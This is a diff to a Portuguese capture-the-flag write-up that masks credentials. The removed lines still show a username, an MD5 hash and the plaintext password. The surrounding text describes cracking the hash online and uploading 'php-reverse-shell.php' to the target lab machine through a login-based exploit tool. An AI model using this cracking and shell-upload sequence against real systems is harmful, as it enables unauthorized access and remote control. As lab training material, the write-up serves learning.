@@ -63,7 +63,7 @@ ID           Response   Lines    Word       Chars       Payload
 <b>Nesse arquivo .sql você irá encontrar um usuário e senha para logar na aplicação.
   
 ```
-"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
+"admin\\";s:7:\\"*******\\";s:6:\\"passwd\\";s:32:\\"********************************\\"
 ```
 
 <b>Para quebrar esse hash usei o "https://crackstation.net/", com o usuário e senha é só acessar a aplicação no url.
@@ -96,8 +96,8 @@ ID           Response   Lines    Word       Chars       Payload
 +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
 
 Enter The Target URL(Example : localhost.com) : 10.10.49.240/content
-Enter Username : manager
-Enter Password : Password123
+Enter Username : *******
+Enter Password : ***********
 Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php
 [+] Sending User&Pass...
 [+] Login Succssfully...
